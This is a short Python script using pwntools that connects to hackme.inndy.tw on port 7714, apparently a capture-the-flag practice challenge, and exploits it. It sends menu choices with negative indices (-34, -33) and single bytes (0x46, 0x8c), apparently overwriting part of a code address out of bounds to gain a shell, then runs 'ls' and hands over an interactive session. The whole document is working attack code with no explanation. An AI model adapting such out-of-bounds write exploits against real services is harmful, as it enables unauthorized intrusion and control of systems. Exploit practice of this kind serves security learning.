from pwn import *

t = remote('hackme.inndy.tw', 7714)
t.sendlineafter('nd? ', '1')
t.sendlineafter('): ', '9')
t.sendline(chr(0x46))
t.sendlineafter('): ', '-34')
t.sendlineafter('): ', '9')
t.sendline(chr(0x8c))
t.sendlineafter('): ', '-33')
t.sendline('ls')
t.interactive()